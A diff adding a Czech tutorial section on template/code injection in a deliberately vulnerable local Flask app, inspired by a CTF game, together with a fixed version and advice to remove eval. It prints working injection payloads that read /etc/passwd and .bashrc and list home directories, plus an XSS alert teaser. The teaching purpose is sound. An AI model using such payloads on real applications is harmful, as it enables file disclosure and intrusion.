@@ -103,3 +103,43 @@ Jak se bránit? Escapovat!
 
 * nebo lze použít předpřipravené SQL statementy a doplnit jako proměnné
 * oboje viz index2.php
+
+### 4. Template injection (Python)
+
+* inspirace: TheCatch (CTF hra) https://thecatch.cz/
+* potřeba spustit samostatně jako Python projekt:
+
+```sh
+cd 04_template_injection
+python -m flask --app app run
+# opravená verze:
+python -m flask --app app2 run
+```
+
+Když navštívíme stránku, tak dostaneme hned přesměrování na URL
+<http://127.0.0.1:5000/hello/user>, kde se nám zobrazí "Hello user". To svádí k
+tomu napsat do URL něco jiného… a skutečně, když změníme poslední část na
+cokoliv, tak se to vypíše.
+
+Zkusme, jestli se tím nedá provést nějaký code injection do šablonovacího
+systému. První bychom potřebovali zjistit, v jakém jazyce je web napsaný. Zkusme
+nejdříve, jestli to není Python, třeba payloadem "+__file__+". Zobrazí se nám
+"Hello /app/app.py", je to Python!
+
+Nyní si můžeme zkoušet hrát. Zkusme si vypsat zdrojový kód souboru app.py
+payloadem "+str(open(__file__).read())+" (odkaz). V tuto chvíli je dobré si
+zobrazit HTML kód stránky, ať vidíme kód aspoň trochu formátovaný:
+
+Vidíme, že je jedná o skutečně jednoduchou aplikaci napsanou v Pythonu pomocí
+webového frameworku Flask. Pojďme tedy zkoumat systém:
+
+* Vypsání `/etc/passwd`: `"+str(open('/etc/passwd').read())+"` [odkaz](http://127.0.0.1:5000/hello/%22+str(open(%22/etc/passwd%22).read())+%22)
+* Vylistování `/home/smf`: `"+str(__import__("os").listdir("/home/smf"))+"` [odkaz](http://127.0.0.1:5000/hello/%22+str(__import__(%22os%22).listdir(%22/home/smf%22))+%22)
+* Přečtení `/home/smf/.bashrc`: `"+str(open("/home/smf/.bashrc").read())+"` [odkaz](http://127.0.0.1:5000/hello/%22+str(open(%22/home/smf/.bashrc%22).read())+%22)
+
+**Jak to opravit?**
+
+* odstranit `eval` :D (v tomhle případě)
+* obecně nevěřit vstupu od uživatele - uživatelé se dělí na dva typy - hloupí uživatelé a útočníci
+
+Teaser na další část (na XSS): http://127.0.0.1:5000/hello/%3Cscript%3Ealert(1)%3C/script%3E
